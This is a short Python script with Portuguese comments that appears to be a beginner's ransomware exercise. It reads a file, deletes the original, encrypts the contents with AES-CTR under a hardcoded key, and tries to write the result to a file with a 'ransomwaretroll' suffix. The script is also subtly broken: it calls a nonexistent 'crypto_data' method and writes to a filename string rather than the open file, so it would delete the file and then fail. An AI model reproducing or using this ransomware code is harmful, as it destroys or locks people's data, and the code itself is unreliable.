import os 
import pyaes

#abrir arquivo a ser criptografado 
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

#remover o arquivo original

os.remove(file_name)

#definindo chave de encriptação

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#criptagrafar arquivo

crypto_data = aes.crypto_data(file_data)

#salva o arquivo criptografado

new_file = file_name + "ransomwaretroll"
new_file_data = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
